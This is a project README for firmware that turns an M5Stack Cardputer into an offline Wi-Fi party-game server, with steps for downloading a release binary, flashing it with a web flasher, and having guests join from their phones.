# 🕹️ hotspot-arcade-cardputer - Play party games without any internet

[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Pimozideoring178/hotspot-arcade-cardputer/releases)

## What is this tool? 🎮

Hotspot Arcade Cardputer turns your M5Stack Cardputer into a portable game server. You do not need an internet connection to use it. The device creates a private wireless network. Your guests connect their phones to this network to play games together. This setup works in any location. You can host games at home, in the park, or on a plane.

## 📋 Requirements

You need these items to run the system:
* An M5Stack Cardputer device.
* A USB-C cable to connect the device to your Windows computer.
* A Windows 10 or Windows 11 computer.
* A smartphone for each player.

## 📥 How to get the software

You must download the firmware files to your computer first. 

1. Visit the [official releases page](https://github.com/Pimozideoring178/hotspot-arcade-cardputer/releases).
2. Look for the latest version at the top of the list.
3. Click the link that ends in .bin to save the file to your computer.
4. Keep this file in a folder you can find later.

## ⚙️ Setting up your Cardputer

Follow these steps to put the game software onto your device:

1. Connect your M5Stack Cardputer to your Windows PC using the USB-C cable.
2. Open the browser and navigate to the M5Stack Web Flasher tool.
3. Choose the COM port that corresponds to your connected device.
4. Select the .bin file you downloaded from the releases page.
5. Click the "Flash" button.
6. Wait for the progress bar to finish. The device will restart automatically when the process ends.

## 📱 How to start a game

Once you flash the software, the device is ready to host.

1. Turn on the Cardputer.
2. The screen will show the main menu.
3. Use the keys to select the game you want to play.
4. The device creates a wireless network. The name of the network usually starts with "Arcade" or the name of the device.
5. Ask your guests to open their phone settings and select this network.
6. If a login page does not appear, tell players to open their mobile web browser and type any address into the bar. This forces the game portal to load.

## 💡 Common troubleshooting steps

If players cannot connect, follow these tips:

* Make sure the Cardputer has enough battery power.
* Check that players connected to the specific network named after the game.
* If a phone asks to use mobile data instead of the network, tell the user to choose the "Stay connected to Wi-Fi" option.
* Restart the Cardputer if the menu stops responding.
* Ensure you are close to the Cardputer. The wireless signal works best within a ten-foot radius.

## 🛠️ Advanced tips for better games

You can manage the game settings through the simple text menu on the Cardputer screen. Use the arrow keys to navigate. Select "Settings" to change the network name or hide the network from public view. 

If you plan to host a large party, keep the Cardputer in an open area. Walls and metal objects block the signal. Avoid placing the device inside a bag or a cabinet. This ensures all players have a stable connection during the match.

## 🔋 Power management

The Cardputer uses very little power. You can run games for several hours on a full charge. If you host a long event, use a portable power bank. Connect the power bank to the USB-C port on the side of the device. This keeps the server running without needing a wall outlet.
